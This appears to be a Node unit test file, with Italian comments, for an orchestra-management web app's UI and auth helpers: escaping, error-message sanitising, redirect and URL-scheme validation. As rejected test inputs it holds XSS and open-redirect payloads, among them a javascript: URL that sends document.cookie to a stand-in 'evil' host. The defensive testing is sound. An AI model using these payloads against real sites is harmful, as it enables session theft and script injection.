/* Funzioni pure di Orchestre: si provano in Node senza browser né rete. */
import test from "node:test";
import assert from "node:assert/strict";
import { esc, roleLabel, isStaff, fmtDate, errMsg, safeHttpUrl } from "../src/ui.js";
import { nextUrl } from "../src/auth.js";

test("esc neutralizza i quattro caratteri pericolosi e tollera null", () => {
  assert.equal(esc('<b a="1">&'), "&lt;b a=&quot;1&quot;&gt;&amp;");
  assert.equal(esc(null), "");
  assert.equal(esc(0), "0");
});

test("roleLabel parla italiano e non inventa ruoli", () => {
  assert.equal(roleLabel("owner"), "Proprietario");
  assert.equal(roleLabel("section"), "Coordinatore di sezione");
  assert.equal(roleLabel("boh"), "boh");
  assert.equal(roleLabel(null), "");
});

test("isStaff: owner/admin/artistic/production sì, section/viewer no", () => {
  for (const r of ["owner", "admin", "artistic", "production"]) assert.equal(isStaff(r), true, r);
  for (const r of ["section", "viewer", null, undefined, ""]) assert.equal(isStaff(r), false, String(r));
});

test("fmtDate formatta all'italiana e tace su date rotte", () => {
  assert.equal(fmtDate("2026-09-04T10:00:00Z"), "04/09/2026");
  assert.equal(fmtDate("non-una-data"), "");
  assert.equal(fmtDate(null), "");
});

test("errMsg: le frasi nostre passano, la lingua del database no", () => {
  /* le eccezioni delle nostre RPC sono già scritte per chi legge */
  assert.equal(errMsg({ message: "non autorizzato", code: "42501" }), "non autorizzato");
  assert.equal(errMsg({ message: "posto già occupato: prima liberalo" }), "posto già occupato: prima liberalo");
  assert.equal(errMsg("secco"), "secco");
  assert.equal(errMsg(null), "Qualcosa non ha risposto. Riprova.");
  /* quello che scrive Postgres non arriva mai negli occhi di chi organizza (collaudo 10/09) */
  const rls = errMsg({ message: 'new row violates row-level security policy for table "orc_productions"', code: "42501" });
  assert.equal(rls, "Non hai i permessi per questa operazione.");
  const dup = errMsg({ message: 'duplicate key value violates unique constraint "orc_musicians_email_key"', code: "23505" });
  assert.match(dup, /Esiste già/);
  const ignoto = errMsg({ message: 'column "pippo" does not exist', code: "42703" });
  assert.doesNotMatch(ignoto, /column|does not exist/, "nessun pezzo di SQL a schermo");
  assert.match(errMsg({ message: "Failed to fetch" }), /rete/);
});

test("nextUrl accetta solo percorsi interni a /orchestre, mai il login, mai host esterni", () => {
  assert.equal(nextUrl("/orchestre/admin/"), "/orchestre/admin/");
  assert.equal(nextUrl("/orchestre/admin/produzioni/?id=1"), "/orchestre/admin/produzioni/?id=1");
  assert.equal(nextUrl("https://evil.example/"), "/orchestre/admin/");
  assert.equal(nextUrl("//evil.example/"), "/orchestre/admin/");
  assert.equal(nextUrl("/app/"), "/orchestre/admin/");
  assert.equal(nextUrl("/orchestre/login/"), "/orchestre/admin/");
  assert.equal(nextUrl("/orchestre/login/?next=x"), "/orchestre/admin/");
  assert.equal(nextUrl(""), "/orchestre/admin/");
  assert.equal(nextUrl(null), "/orchestre/admin/");
  assert.equal(nextUrl("javascript:alert(1)"), "/orchestre/admin/");
  assert.equal(nextUrl("/orchestre/admin/ x"), "/orchestre/admin/");
  assert.equal(nextUrl("/orchestre\\evil"), "/orchestre/admin/");
});

test("safeHttpUrl lascia passare solo http e https", () => {
  /* Il campo «Sito o pagina» è un <input type="url">, che accetta javascript: come URL valida.
     Quel link lo apre lo staff dalla scheda della candidatura: deve restare inerte. */
  assert.equal(safeHttpUrl("javascript:fetch('//evil/'+document.cookie)"), "");
  assert.equal(safeHttpUrl("JavaScript:alert(1)"), "");
  assert.equal(safeHttpUrl("  javascript:alert(1)  "), "");
  assert.equal(safeHttpUrl("data:text/html,<script>alert(1)</script>"), "");
  assert.equal(safeHttpUrl("vbscript:msgbox"), "");
  assert.equal(safeHttpUrl("file:///etc/passwd"), "");
  assert.equal(safeHttpUrl("https://example.org/x?a=1"), "https://example.org/x?a=1");
  assert.equal(safeHttpUrl("http://example.org/"), "http://example.org/");
  assert.equal(safeHttpUrl("example.org"), "");  /* senza schema non è un indirizzo assoluto: resta testo */
  assert.equal(safeHttpUrl(null), "");
  assert.equal(safeHttpUrl(""), "");
});

test("esc neutralizza anche l'apice singolo", () => {
  /* Un attributo scritto con apici singoli è legittimo in HTML: se esc non copre l'apice,
     `<b title='...'>` si chiude da dentro. */
  assert.equal(esc("l'ho fatto"), "l&#39;ho fatto");
  assert.equal(esc("' onmouseover=alert(1) x='"), "&#39; onmouseover=alert(1) x=&#39;");
});
